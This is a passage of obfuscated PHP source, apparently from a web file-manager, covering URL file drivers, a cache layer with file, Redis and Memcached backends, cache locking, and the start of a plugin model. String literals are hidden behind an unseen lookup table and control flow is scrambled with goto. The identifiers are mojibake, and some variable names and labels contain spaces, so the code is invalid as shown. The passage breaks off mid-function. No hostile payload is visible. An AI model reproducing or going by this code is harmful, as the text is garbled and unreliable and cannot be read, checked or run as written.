parent::fileOut($a¶ø”ÂÉœÃ, $c•îŒ‰Ê‘Ğ, $Dî©ñÌ„ïˆ, $Eˆá˜Å‡Ø¾); } public function fileOutImage($a¾ïÁ¼›‘, $d„¿Æ¸­š = 250) { $a¢œ‰òåßÎ = $this->link($a¾ïÁ¼›‘ . $_SERVER[Š‰][1343] . $d„¿Æ¸­š); $this->fileOutLink($a¢œ‰òåßÎ); } public function fileOutImageServer($D†‚ÏÌƒ›š, $d¼š§ÄŞ’× = 250) { parent::fileOutImage($D†‚ÏÌƒ›š, $d¼š§ÄŞ’×); } public function hashMd5($fÌ·Û“ÏÜÖ) { $AŠ‚ÖŸ´‚Œ =& $_SERVER[Š‰]; $DÓ¤‰¸Ê = $this->_objectMeta($fÌ·Û“ÏÜÖ); return isset($DÓ¤‰¸Ê[$AŠ‚ÖŸ´‚Œ[206]]) ? $DÓ¤‰¸Ê[$AŠ‚ÖŸ´‚Œ[206]] : !1; } public function size($f’Ÿô‘†î) { $B£İ¡…½ÚÄ = $this->objectMeta($f’Ÿô‘†î); return $B£İ¡…½ÚÄ ? $B£İ¡…½ÚÄ[$_SERVER[Š‰][77]] : 0; } public function info($bàË”¥ê©à) { if ($this->isFolder($bàË”¥ê©à)) { return $this->folderInfo($bàË”¥ê©à); } else { if ($this->isFile($bàË”¥ê©à)) { return $this->fileInfo($bàË”¥ê©à); } } return !1; } public function exist($b·ÌÓ®‘óå) { return $this->isFile($b·ÌÓ®‘óå) || $this->isFolder($b·ÌÓ®‘óå); } public function isFile($cù‹–ÂœÚ) { return !$this->isFolder($cù‹–ÂœÚ) && $this->objectMeta($cù‹–ÂœÚ); } public function isFolder($AƒĞ‚²·–ï) { return $this->cacheMethod($_SERVER[Š‰][197], $AƒĞ‚²·–ï); } protected function objectMeta($D¾¨İòç±„) { return $this->cacheMethod($_SERVER[Š‰][198], $D¾¨İòç±„); } protected function _objectMeta($D÷ò†Ñâ) { goto B¡ÅÑ ÌË; D¯«ìÖ­¡: if (!$Aì¬’¾¶Ï¡[$fºô˜ì¶[1062]]) { return null; } $F¸Ö£Îó°í = isset($Aì¬’¾¶Ï¡[$fºô˜ì¶[1064]]) ? $Aì¬’¾¶Ï¡[$fºô˜ì¶[1064]] : array(); if (!isset($F¸Ö£Îó°í[$fºô˜ì¶[1345]])) { return null; } goto fÔê¥Œ„ª¸; B¡ÅÑ ÌË: $fºô˜ì¶ =& $_SERVER[Š‰]; if ($D÷ò†Ñâ == $fºô˜ì¶[33] || $D÷ò†Ñâ == $fºô˜ì¶[8]) { return array(); } $Aì¬’¾¶Ï¡ = $this->ussRequest($D÷ò†Ñâ, $fºô˜ì¶[1344]); goto D¯«ìÖ­¡; fÔê¥Œ„ª¸: $C†˜Ã„èƒ­ = array($fºô˜ì¶[29] => isset($F¸Ö£Îó°í[$fºô˜ì¶[1345]]) ? $F¸Ö£Îó°í[$fºô˜ì¶[1345]] : null, $fºô˜ì¶[77] => isset($F¸Ö£Îó°í[$fºô˜ì¶[1346]]) ? $F¸Ö£Îó°í[$fºô˜ì¶[1346]] : null, $fºô˜ì¶[206] => isset($F¸Ö£Îó°í[$fºô˜ì¶[1347]]) ? $F¸Ö£Îó°í[$fºô˜ì¶[1347]] : null, $fºô˜ì¶[1314] => isset($F¸Ö£Îó°í[$fºô˜ì¶[1348]]) ? $F¸Ö£Îó°í[$fºô˜ì¶[1348]] : null); $C†˜Ã„èƒ­[$fºô˜ì¶[1315]] = isset($F¸Ö£Îó°í[$fºô˜ì¶[1349]]) ? strtotime($F¸Ö£Îó°í[$fºô˜ì¶[1349]]) : $C†˜Ã„èƒ­[$fºô˜ì¶[1314]]; return $C†˜Ã„èƒ­; goto fÏÂí¡ŠÃ; fÏÂí¡ŠÃ: } protected function _isFolder($e×šÙ•‹ô) { $e­Îî¥áß =& $_SERVER[Š‰]; if ($e×šÙ•‹ô == $e­Îî¥áß[33] || $e×šÙ•‹ô == $e­Îî¥áß[8]) { return !0; } $C‘ğŠ×‹Ó¾ = $this->_objectMeta($e×šÙ•‹ô); return isset($C‘ğŠ×‹Ó¾[$e­Îî¥áß[29]]) && $C‘ğŠ×‹Ó¾[$e­Îî¥áß[29]] == $e­Îî¥áß[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($cÃ»ù°†µ = false) { } public function exist($Bç…¡ÛÈÍÑ) { $e•ŒÚ¡¥‚Ö = $this->info($Bç…¡ÛÈÍÑ); return $e•ŒÚ¡¥‚Ö[$_SERVER[Š‰][193]]; } public function isFile($D›ôß©„Àµ) { $bÁŸÙ¶½ÖÒ = $this->info($D›ôß©„Àµ); return $bÁŸÙ¶½ÖÒ[$_SERVER[Š‰][193]]; } public function isFolder($d¸Ü³¡¨Ö•) { return !1; } public function size($a—Õ‚áØš) { $e ïÛ„ÕË = $this->info($a—Õ‚áØš); return $e ïÛ„ÕË[$_SERVER[Š‰][77]]; } public function info($FÅŸš®×®³) { return $this->infoParse($FÅŸš®×®³); } public function infoAuth($E£ï™Á‘Æ•) { return $this->infoParse($E£ï™Á‘Æ•); } public function infoWithChildren($cÃºÌÏéÍÜ) { return $this->infoParse($cÃºÌÏéÍÜ); } public function infoFull($aŠ˜‚´¤ºÁ) { return $this->infoParse($aŠ˜‚´¤ºÁ); } private function infoParse($Bôë‡¬¢²õ) { $cªÚÚ…¶à· =& $_SERVER[Š‰]; $bÚä»‚¹ÎÑ = $this->header($Bôë‡¬¢²õ); if (!$bÚä»‚¹ÎÑ || !$bÚä»‚¹ÎÑ[$cªÚÚ…¶à·[702]]) { return !1; } $cóÆ´šÙª = _get($bÚä»‚¹ÎÑ, $cªÚÚ…¶à·[333], 0); $aºîÍ¬Üß = array($cªÚÚ…¶à·[28] => $bÚä»‚¹ÎÑ[$cªÚÚ…¶à·[28]], $cªÚÚ…¶à·[75] => $Bôë‡¬¢²õ, $cªÚÚ…¶à·[29] => $cªÚÚ…¶à·[173], $cªÚÚ…¶à·[77] => intval($cóÆ´šÙª), $cªÚÚ…¶à·[167] => get_path_ext($bÚä»‚¹ÎÑ[$cªÚÚ…¶à·[28]]), $cªÚÚ…¶à·[1229] => $cóÆ´šÙª > 0 && $bÚä»‚¹ÎÑ[$cªÚÚ…¶à·[1350]], $cªÚÚ…¶à·[1230] => !1); return $aºîÍ¬Üß; } private function header($f¼‡ÔêºÇ‡) { goto E¤°‚ƒÊçğ; b¾á…¢Çè: $GLOBALS[$D·õ…»­¨[1351]] = !0; self::$_cacheHeader[$f¼‡ÔêºÇ‡] = url_header($f¼‡ÔêºÇ‡); $GLOBALS[$D·õ…»­¨[1351]] = $D„»Š¤†Óù; goto Dñ†ÜÙÆ¯‹; E¤°‚ƒÊçğ: $D·õ…»­¨ =& $_SERVER[Š‰]; if (isset(self::$_cacheHeader[$f¼‡ÔêºÇ‡])) { return self::$_cacheHeader[$f¼‡ÔêºÇ‡]; } $D„»Š¤†Óù = isset($GLOBALS[$D·õ…»­¨[1351]]) ? $GLOBALS[$D·õ…»­¨[1351]] : !1; goto b¾á…¢Çè; Dñ†ÜÙÆ¯‹: return self::$_cacheHeader[$f¼‡ÔêºÇ‡]; goto d‡äÂ³åœ; d‡äÂ³åœ: } public function hashSimple($Câ÷ëÓÌŒ«, $D…æèÌ³¡á = false) { goto E¸šÜí¹®Ğ; eÊ½‰ÛñØá: $c¼’Üâ–ç¤ .= $this->fileSubstr($Câ÷ëÓÌŒ«, $B×å‰¼éÛò - $D¨İÂ„›Ç, $D¨İÂ„›Ç); return md5($c¼’Üâ–ç¤) . $B×å‰¼éÛò; goto AÒŞØ®˜ƒ; f ±¾×”: $C“ÃôÏŞšâ = timeFloat(); $Dê¾ÅÁéì = 15; for ($bº©éºÛ“ = 0; $bº©éºÛ“ < $E§õ‚á¹ãÒ; $bº©éºÛ“++) { if (timeFloat() - $C“ÃôÏŞšâ > $Dê¾ÅÁéì) { return !1; } $c‘ÆÙçœî¿ = $this->fileSubstr($Câ÷ëÓÌŒ«, $AĞŠÏËï¶‰ * $bº©éºÛ“, $D¨İÂ„›Ç); if (!$c‘ÆÙçœî¿) { return !1; } $c¼’Üâ–ç¤ .= $c‘ÆÙçœî¿; } goto eÊ½‰ÛñØá; BÖ´õäœ: if ($B×å‰¼éÛò <= $D¨İÂ„›Ç * $E§õ‚á¹ãÒ) { return md5($this->fileSubstr($Câ÷ëÓÌŒ«, 0, $B×å‰¼éÛò)) . $B×å‰¼éÛò; } $AĞŠÏËï¶‰ = intval($B×å‰¼éÛò / $E§õ‚á¹ãÒ); $c¼’Üâ–ç¤ = $C°ÜâÌé¢æ[33]; goto f ±¾×”; eô¿ÌÉ…¡Ò: $B×å‰¼éÛò = $F³·ğÓ´[$C°ÜâÌé¢æ[77]]; $D¨İÂ„›Ç = 200; $E§õ‚á¹ãÒ = 50; goto BÖ´õäœ; E¸šÜí¹®Ğ: $C°ÜâÌé¢æ =& $_SERVER[Š‰]; $F³·ğÓ´ = $this->info($Câ÷ëÓÌŒ«); if (!$F³·ğÓ´ || !$F³·ğÓ´[$C°ÜâÌé¢æ[193]]) { return !1; } goto eô¿ÌÉ…¡Ò; AÒŞØ®˜ƒ: } public function getContent($fÌ©¶ïÌŒ) { return $this->fileSubstr($fÌ©¶ïÌŒ); } public function fileSubstr($F·Ÿôˆ‹¹Í, $BñÜ»‹´ëÆ = 0, $fù‚ÉŒ‚®¼ = -1) { goto E„öù”¢Â; fâ®êÔï: $Bï‘ôÓ³‡ = url_request($F·Ÿôˆ‹¹Í, $a›šÄ¸´‰[226], !1, $bÊË³ƒò›, !1, !1, 1); return $Bï‘ôÓ³‡[$a›šÄ¸´‰[1064]] ? $Bï‘ôÓ³‡[$a›šÄ¸´‰[1064]] : $a›šÄ¸´‰[33]; goto AË¾êÜ‡ã‰; b›áäÂ¡­ò: if ($fù‚ÉŒ‚®¼ === -1) { $fù‚ÉŒ‚®¼ = $A†ˆùĞÀëš[$a›šÄ¸´‰[77]]; } if ($fù‚ÉŒ‚®¼ == 0) { return $a›šÄ¸´‰[33]; } $bÊË³ƒò› = array($a›šÄ¸´‰[1352] . $BñÜ»‹´ëÆ . $a›šÄ¸´‰[728] . ($BñÜ»‹´ëÆ + $fù‚ÉŒ‚®¼ - 1)); goto fâ®êÔï; E„öù”¢Â: $a›šÄ¸´‰ =& $_SERVER[Š‰]; $A†ˆùĞÀëš = $this->info($F·Ÿôˆ‹¹Í); if (!$A†ˆùĞÀëš || !$A†ˆùĞÀëš[$a›šÄ¸´‰[193]] && $A†ˆùĞÀëš[$a›šÄ¸´‰[77]] > 1024 * 1024 * 10) { return !1; } goto b›áäÂ¡­ò; AË¾êÜ‡ã‰: } public function download($C›Ôª—ĞÇ˜, $aê¿íèò©ã) { Downloader::start($C›Ôª—ĞÇ˜, $aê¿íèò©ã); return $aê¿íèò©ã; } } goto b†Ãêšê¼é; eØ«ƒ‘å¢ë: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto dáäÇ›°¦Õ; dáäÇ›°¦Õ: $Ağƒ®ÕÄ =& $_SERVER[Š‰]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto eÇ‰ËÂÀÓ²; ešÛäªŒø: switch ($bÜŒ¥ÖÖÎ[$Ağƒ®ÕÄ[777]]) { case $Ağƒ®ÕÄ[17]: self::$handle = Model($Ağƒ®ÕÄ[779]); break; case $Ağƒ®ÕÄ[780]: self::$handle = new CacheRedis($f©˜‚»»à, $B›ê…˜Œ›×); break; case $Ağƒ®ÕÄ[781]: self::$handle = new CacheMemcached($f©˜‚»»à, $B›ê…˜Œ›×); break; case $Ağƒ®ÕÄ[173]: self::$handle = new CacheFile($f©˜‚»»à, $B›ê…˜Œ›×); break; default: break; } return self::$handle; goto b¡¸¡¯¸°¢; eÇ‰ËÂÀÓ²: $bÜŒ¥ÖÖÎ = $GLOBALS[$Ağƒ®ÕÄ[6]][$Ağƒ®ÕÄ[345]]; $f©˜‚»»à = $bÜŒ¥ÖÖÎ[$bÜŒ¥ÖÖÎ[$Ağƒ®ÕÄ[777]]]; $B›ê…˜Œ›× = $bÜŒ¥ÖÖÎ[$Ağƒ®ÕÄ[778]]; goto ešÛäªŒø; b¡¸¡¯¸°¢: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($EÜ°Òã’‘¾) { if (is_array($EÜ°Òã’‘¾) || is_object($EÜ°Òã’‘¾)) { $EÜ°Òã’‘¾ = json_encode($EÜ°Òã’‘¾); } $EÜ°Òã’‘¾ = rawurlencode($EÜ°Òã’‘¾); return md5(KOD_SITE_ID . $_SERVER[Š‰][70] . $EÜ°Òã’‘¾); } public static function get($eïš¢é„«Ó, $D©›™‚è¤ = false) { $c³ô–íÚ“ = self::key($eïš¢é„«Ó); if ($D©›™‚è¤) { return unserialize(self::init()->get($c³ô–íÚ“)); } if (!isset(self::$memoryCache[$c³ô–íÚ“])) { $e„ÊÊˆÙÎ = self::init()->get($c³ô–íÚ“); self::$memoryCache[$c³ô–íÚ“] = unserialize($e„ÊÊˆÙÎ); } return self::$memoryCache[$c³ô–íÚ“]; } public static function set($F×ÇÕä¥º, $AÁ££‡„„£, $Fä²ëÊôİ¸ = false) { goto B’Ú÷Í Œ; b—Ì–¤” ã: CacheLock::lock($F×ÇÕä¥º); $bùØÁ´ëİ = self::init()->set($C°£ƒ‡Ç‘â, serialize($AÁ££‡„„£), $Fä²ëÊôİ¸); self::$memoryCache[$C°£ƒ‡Ç‘â] = $AÁ££‡„„£; goto FÉÚóˆÓÁ±; FÉÚóˆÓÁ±: CacheLock::unlock($F×ÇÕä¥º); return $bùØÁ´ëİ; goto B¤­¸³µá’; B’Ú÷Í Œ: $C°£ƒ‡Ç‘â = self::key($F×ÇÕä¥º); if (isset(self::$memoryCache[$C°£ƒ‡Ç‘â]) && self::$memoryCache[$C°£ƒ‡Ç‘â] === $AÁ££‡„„£) { return !0; } if ($Fä²ëÊôİ¸ === 0) { self::$memoryCache[$C°£ƒ‡Ç‘â] = $AÁ££‡„„£; return !0; } goto b—Ì–¤” ã; B¤­¸³µá’: } public static function remove($dø¥ŞÂÑ£ã) { goto cÌƒå¼’ªŸ; dİîˆ®Æ’Å: return $aŞÁøÌš…À; goto fÓ¹¬Ùô¶†; aÊããËÜÔ•: CacheLock::lock($dø¥ŞÂÑ£ã); $aŞÁøÌš…À = self::init()->remove($Dä‘‚ÒšÛÆ); CacheLock::unlock($dø¥ŞÂÑ£ã); goto dİîˆ®Æ’Å; cÌƒå¼’ªŸ: $Dä‘‚ÒšÛÆ = self::key($dø¥ŞÂÑ£ã); unset(self::$memoryCache[$Dä‘‚ÒšÛÆ]); self::clearTimeout(); goto aÊããËÜÔ•; fÓ¹¬Ùô¶†: } public static function removeMemory($AÏ„µš°˜) { $Dš·ºŞíç« = self::key($AÏ„µš°˜); unset(self::$memoryCache[$Dš·ºŞíç«]); } public static function clearMemory($DÓ¯ŸÓ¶¯ = false) { if ($DÓ¯ŸÓ¶¯) { $DÓ¯ŸÓ¶¯ = self::key($DÓ¯ŸÓ¶¯); unset(self::$memoryCache[$DÓ¯ŸÓ¶¯]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Š‰][782])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Š‰][783])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($D¶ÔÛå, $fæ‚ÇŠ¾) { $Fî¶ƒÄ÷…Ã =& $_SERVER[Š‰]; $this->cachePath = $D¶ÔÛå[$Fî¶ƒÄ÷…Ã[75]]; $this->prefix = $Fî¶ƒÄ÷…Ã[784]; $this->cacheTime = $fæ‚ÇŠ¾; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($a¤¡Í¸¯ÒÔ) { $e ¥öô³É¾ =& $_SERVER[Š‰]; $a¤¡Í¸¯ÒÔ = str_replace(array($e ¥öô³É¾[785], $e ¥öô³É¾[96], $e ¥öô³É¾[69]), $e ¥öô³É¾[786], $a¤¡Í¸¯ÒÔ); return $this->cachePath . $e ¥öô³É¾[787] . $a¤¡Í¸¯ÒÔ . $e ¥öô³É¾[788]; } public function set($dà‘Ğà¡í¤, $bŸÎ¾ÎÔ•Á, $FÕ…¬£š˜Š = false) { $FàÊ‚»‡Æ¬ = $this->getFile($dà‘Ğà¡í¤); if (file_put_contents($FàÊ‚»‡Æ¬, $this->prefix . $bŸÎ¾ÎÔ•Á, LOCK_EX)) { return !0; } @unlink($FàÊ‚»‡Æ¬); return !1; } public function get($dæŞÚ¯Œ‡Ë) { $fÏĞÛßñù¼ = $this->getFile($dæŞÚ¯Œ‡Ë); if (file_exists($fÏĞÛßñù¼) && filemtime($fÏĞÛßñù¼) < time() - $this->cacheTime) { @unlink($fÏĞÛßñù¼); return !1; } $dá†Îï¬ÅÈ = @file_get_contents($fÏĞÛßñù¼); return substr($dá†Îï¬ÅÈ, strlen($this->prefix)); } public function remove($f ¬Ò…²‚ˆ) { $Dª¾±‘ŞÄ = $this->getFile($f ¬Ò…²‚ˆ); return @unlink($Dª¾±‘ŞÄ); } public function deleteAll() { $F’‘İéùÉö =& $_SERVER[Š‰]; $e›¬Šë“ó‚ = scandir($this->cachePath); foreach ($e›¬Šë“ó‚ as $CŒàÔæõÓİ) { $Dì‘à…Ñù„ = $this->cachePath . $CŒàÔæõÓİ; if (strpos($Dì‘à…Ñù„, $F’‘İéùÉö[788]) && strpos($Dì‘à…Ñù„, $F’‘İéùÉö[789])) { @unlink($Dì‘à…Ñù„); } } } public function clearTimeout() { $cìŒÓæË¦¤ =& $_SERVER[Š‰]; $FÜ‰¿¹”Õ£ = scandir($this->cachePath); foreach ($FÜ‰¿¹”Õ£ as $fÜæŠ®†ââ) { $CÀ³Ô°„øÚ = $this->cachePath . $fÜæŠ®†ââ; if (strpos($CÀ³Ô°„øÚ, $cìŒÓæË¦¤[788]) && strpos($CÀ³Ô°„øÚ, $cìŒÓæË¦¤[789]) && filemtime($CÀ³Ô°„øÚ) < time() - $this->cacheTime) { @unlink($CÀ³Ô°„øÚ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto B÷©ØÄÎ¸×; F˜Å‹¥ÓÑ‡: if ($b–ÙÍ’Çõ == $E×µˆ¬‘[17] && $dâ÷·Šöòí == $E×µˆ¬‘[9]) { $b–ÙÍ’Çõ = $E×µˆ¬‘[173]; } switch ($b–ÙÍ’Çõ) { case $E×µˆ¬‘[780]: self::$handle = new CacheLockRedis(); break; case $E×µˆ¬‘[781]: self::$handle = new CacheLockMemcached(); break; case $E×µˆ¬‘[17]: self::$handle = new CacheLockDatabase(); break; case $E×µˆ¬‘[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto Cîòé„íÃØ; B÷©ØÄÎ¸×: $E×µˆ¬‘ =& $_SERVER[Š‰]; if (self::$handle) { return self::$handle; } $dºˆ¸Ù¦’Ò = $GLOBALS[$E×µˆ¬‘[6]][$E×µˆ¬‘[345]]; goto a¿Á­ÂÍä; a¿Á­ÂÍä: self::$timeout = $dºˆ¸Ù¦’Ò[$E×µˆ¬‘[790]] ? $dºˆ¸Ù¦’Ò[$E×µˆ¬‘[790]] : 10; $dâ÷·Šöòí = _get($GLOBALS[$E×µˆ¬‘[6]], $E×µˆ¬‘[791]); $b–ÙÍ’Çõ = $dºˆ¸Ù¦’Ò[$E×µˆ¬‘[777]] ? $dºˆ¸Ù¦’Ò[$E×µˆ¬‘[777]] : $E×µˆ¬‘[173]; goto F˜Å‹¥ÓÑ‡; Cîòé„íÃØ: } private static function key($b½™Óùù…›) { return $_SERVER[Š‰][792] . Cache::key($b½™Óùù…›); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($fïÚ®Ğ“½è = '') { self::$errorMsg = $fïÚ®Ğ“½è; } public static function lockGlobal($a§ÃÁÎ‘¿Ê, $C­ ¨ŒëÉè) { return self::lock($a§ÃÁÎ‘¿Ê, $C­ ¨ŒëÉè, !0); } public static function lock($dÅ‡ßî‰è¿, $aâç¶ò“„Œ = false, $B‰ùåâ×» = false) { goto a¼½éØš¥; DÊå²Šô¾‚: $aâç¶ò“„Œ = $aâç¶ò“„Œ ? $aâç¶ò“„Œ : self::$timeout; $Bôõ«Üˆƒæ = $CêÁíëË¥¶->lock($bÔÃààÉñù, $aâç¶ò“„Œ); if (!$Bôõ«Üˆƒæ) { $DßŸ‹‘½Ñ = "\x6c\x6f\143\153\x20\145\x72\162\x6f\x72\73\x6b\x65\x79\75{$dÅ‡ßî‰è¿}\73\164\x69\155\145\75{$aâç¶ò“„Œ}\x3b" . self::$errorMsg . $dñø—°Œš˜[67] . get_caller_msg(); $b®áŸƒ®¡ó = LNG($dñø—°Œš˜[793]) . "\50{$aâç¶ò“„Œ}\x73\x29\56" . LNG($dñø—°Œš˜[794]); $b®áŸƒ®¡ó .= $dñø—°Œš˜[795]; if (is_string(self::$errorMsg) && self::$errorMsg) { $b®áŸƒ®¡ó = $b®áŸƒ®¡ó . $dñø—°Œš˜[796] . self::$errorMsg; } write_log($DßŸ‹‘½Ñ, $dñø—°Œš˜[797]); show_json($b®áŸƒ®¡ó, !1); } goto féŸ¾Ş‰Ô; féŸ¾Ş‰Ô: if (!$B‰ùåâ×») { self::$lockItem[$bÔÃààÉñù] = !0; } return $Bôõ«Üˆƒæ; goto C‹½–¥Ìò; a¼½éØš¥: $dñø—°Œš˜ =& $_SERVER[Š‰]; $CêÁíëË¥¶ = self::init(); $bÔÃààÉñù = self::key($dÅ‡ßî‰è¿); goto DÊå²Šô¾‚; C‹½–¥Ìò: } public static function lockGet($b£İ¥§åÍÕ) { $d°÷İÙµ = self::key($b£İ¥§åÍÕ); if (self::$lockItem[$d°÷İÙµ]) { return self::$lockItem[$d°÷İÙµ]; } return self::init()->lockGet($d°÷İÙµ); } public static function unlock($a¾õ—´ÙŞõ) { $BĞó†œ÷ƒ = self::key($a¾õ—´ÙŞõ); self::$lockItem[$BĞó†œ÷ƒ] = null; return self::init()->unlock($BĞó†œ÷ƒ); } public static function unlockRuntime() { $E‚„Ö‘¾ =& $_SERVER[Š‰]; $EŸÂ…µÉß³ = self::init(); $BÅÔùùÃß = !1; foreach (self::$lockItem as $a´Ñ×ŸÏ÷µ => $cêˆ²ùƒö×) { if (!$cêˆ²ùƒö×) { continue; } $EŸÂ…µÉß³->unlock($a´Ñ×ŸÏ÷µ); if (!$BÅÔùùÃß) { $BÅÔùùÃß = !0; write_log($E‚„Ö‘¾[798] . $a´Ñ×ŸÏ÷µ . $E‚„Ö‘¾[67] . get_caller_msg(), $E‚„Ö‘¾[797]); continue; } write_log($E‚„Ö‘¾[798] . $a´Ñ×ŸÏ÷µ, $E‚„Ö‘¾[797]); } self::fileUnlockAll(); } public static function fileLock($c™¼ÅÇî) { goto e¥—¾Ñõˆå; B®²œÄ³ê¼: $eØÒø¢È’¾ = fopen(DATA_PATH . $c™¼ÅÇî . $b¸÷Å¯¸Áï[800], $b¸÷Å¯¸Áï[801]); if (!$eØÒø¢È’¾) { return !1; } $GLOBALS[$b¸÷Å¯¸Áï[799]][$c™¼ÅÇî] = $eØÒø¢È’¾; goto a¯¤¢íÁ‹; a¯¤¢íÁ‹: if (flock($eØÒø¢È’¾, LOCK_EX)) { return !0; } self::unlock($c™¼ÅÇî); show_json($b¸÷Å¯¸Áï[802], !1); goto b¬ğ´–†×; e¥—¾Ñõˆå: $b¸÷Å¯¸Áï =& $_SERVER[Š‰]; if (!$GLOBALS[$b¸÷Å¯¸Áï[799]]) { $GLOBALS[$b¸÷Å¯¸Áï[799]] = array(); } $GLOBALS[$b¸÷Å¯¸Áï[799]][$c™¼ÅÇî] = !1; goto B®²œÄ³ê¼; b¬ğ´–†×: return !1; goto Dò–ÁÉ‚»¡; Dò–ÁÉ‚»¡: } public static function fileUnlock($FÇòÊ¯øÆÒ) { $D‰—¶ßÖö =& $_SERVER[Š‰]; $C°ŒÒôÖÊÓ = $GLOBALS[$D‰—¶ßÖö[799]][$FÇòÊ¯øÆÒ]; if (!$C°ŒÒôÖÊÓ) { return; } $GLOBALS[$D‰—¶ßÖö[799]][$FÇòÊ¯øÆÒ] = !1; flock($C°ŒÒôÖÊÓ, LOCK_UN); fclose($C°ŒÒôÖÊÓ); } public static function fileUnlockAll() { $cÙŸáìƒ‡ =& $_SERVER[Š‰]; if (!$GLOBALS[$cÙŸáìƒ‡[799]]) { return; } foreach ($GLOBALS[$cÙŸáìƒ‡[799]] as $b…¿ê½Œ => $B“È˜ù¡¢É) { if (!$B“È˜ù¡¢É) { continue; } $GLOBALS[$cÙŸáìƒ‡[799]][$b…¿ê½Œ] = !1; flock($B“È˜ù¡¢É, LOCK_UN); fclose($B“È˜ù¡¢É); } $GLOBALS[$cÙŸáìƒ‡[799]] = array(); } } goto b¨Š•„ôİ£; fÔàîÑÂ¤: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x70\154\x75\147\151\x6e\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\145", "\163\164\141\x74\x75\163", "\x72\x65\147\151\x65\163\164", "\x63\157\156\x66\151\x67"); public function loadList($cöõ“«Ó‹¿ = false) { $FÆ¡²„†ªõ = array_to_keyvalue($this->listData(), $_SERVER[Š‰][28]); if ($cöõ“«Ó‹¿) { return $FÆ¡²„†ªõ[$cöõ“«Ó‹¿]; } return $FÆ¡²„†ªõ; } public function init() { $dËƒëéÈš =& $_SERVER[Š‰]; Hook::trigger($dËƒëéÈš[1775]); $CêˆğêÒÔˆ = $this->loadPluginList(); foreach ($CêˆğêÒÔˆ as $f¤ŸÀÃñ©„ => $AŠ¼ªÄ“ö‰) { $c¶Ñ¶ğ®ÙÒ = $this->appAllow($f¤ŸÀÃñ©„, $AŠ¼ªÄ“ö‰); if (!$c¶Ñ¶ğ®ÙÒ) { continue; } foreach ($AŠ¼ªÄ“ö‰[$dËƒëéÈš[1776]] as $C—Ï„İã¸Ì => $B¯¾ÏíÊ…¿) { Hook::bind($C—Ï„İã¸Ì, $B¯¾ÏíÊ…¿); } } Hook::trigger($dËƒëéÈš[1777]); Hook::trigger(ACTION); } public function appAllow($D ¿‹íæÉİ, $fØÔÉƒå, $Aäì¶ÛÑä… = true) { $Bõ¥ÃÉ…¿ =& $_SERVER[Š‰]; $EĞÓ¸ôùŞÎ = PLUGIN_DIR . $D ¿‹íæÉİ . $Bõ¥ÃÉ…¿[1778]; if (!is_array($fØÔÉƒå) || !is_array($fØÔÉƒå[$Bõ¥ÃÉ…¿[1776]]) || $fØÔÉƒå[$Bõ¥ÃÉ…¿[702]] != 1 || !is_file($EĞÓ¸ôùŞÎ)) { return !1; } if ($GLOBALS[$Bõ¥ÃÉ…¿[479]] == 1) { return !0; } if ($Aäì¶ÛÑä… && !Action($Bõ¥ÃÉ…¿[1779])->checkAuth($D ¿‹íæÉİ)) { return !1; } return !0; } public function unInstall($DÑŒåÚÀ±•) { $aòÖˆé‰¨â =& $_SERVER[Š‰]; $aÛ‰Çõ¼ß· = $this->loadList($DÑŒåÚÀ±•); if (file_exists(PLUGIN_DIR . $DÑŒåÚÀ±•)) { Hook::apply($DÑŒåÚÀ±• . $aòÖˆé‰¨â[1780]); } $this->remove($aÛ‰Çõ¼ß·[$aòÖˆé‰¨â[388]]); } public function changeStatus($aˆ’³‘‘êŞ, $e·®ë¹ë´À) { $d™Öàåí¬ò =& $_SERVER[Š‰]; $fÑÜ±½Áïğ = $this->loadList($aˆ’³‘‘êŞ); if ($e·®ë¹ë´À) { Hook::apply($aˆ’³‘‘êŞ . $d™Öàåí¬ò[1781]); } $this->update($fÑÜ±½Áïğ[$d™Öàåí¬ò[388]], array($d™Öàåí¬ò[1782] => $e·®ë¹ë´À)); } public function appRegist($Aİ˜õ¸¤Ã†, $D·£È‡Ÿ¨) { $aÃŞÒ†î¨ =& $_SERVER[Š‰]; $e¥¬ÒïòØá = $this->loadList($Aİ˜õ¸¤Ã†); if ($e¥¬ÒïòØá) { $this->update($e¥¬ÒïòØá[$aÃŞÒ†î¨[388]], array($aÃŞÒ†î¨[1776] => $D·£È‡Ÿ¨)); } else { $D²ß»È‚Ï = array($aÃŞÒ†î¨[28] => $Aİ˜õ¸¤Ã†, $aÃŞÒ†î¨[1776] => $D·£È‡Ÿ¨, $aÃŞÒ†î¨[702] => 0, $aÃŞÒ†î¨[6] => $this->getConfigDefault($Aİ˜õ¸¤Ã†)); $this->insert($D²ß»È‚Ï); } } public function getConfigDefault($CÕØ©§…Ö) { $Aœ“’æãÛ =& $_SERVER[Š‰]; $e®Ü½İÛò = array(); $DÃ“ÊÁ®¸Ã = $this->getPackageJson($CÕØ©§…Ö); if (!$DÃ“ÊÁ®¸Ã && is_array($DÃ“ÊÁ®¸Ã[$Aœ“’æãÛ[1783]])) { return $e®Ü½İÛò; } foreach ($DÃ“ÊÁ®¸Ã[$Aœ“’æãÛ[1783]] as $bÖ˜‚†ï·Ë => $fİÜ¿ö¦Áš) { if (!isset($fİÜ¿ö¦Áš[$Aœ“’æãÛ[370]]) || isset($e®Ü½İÛò[$bÖ˜‚†ï·Ë])) { continue; } $e®Ü½İÛò[$bÖ˜‚†ï·Ë] = $fİÜ¿ö¦Áš[$Aœ“’æãÛ[370]]; } return $e®Ü½İÛò; } public function getPackageJson($F”â»£Š¨) { return Hook::apply($F”â»£Š¨ . $_SERVER[Š‰][1784]); } public function getConfig($CÔæçÛ×Ú›, $fƒÆô²â´ã = false) { $f…«¸Š†İ =& $_SERVER[Š‰]; 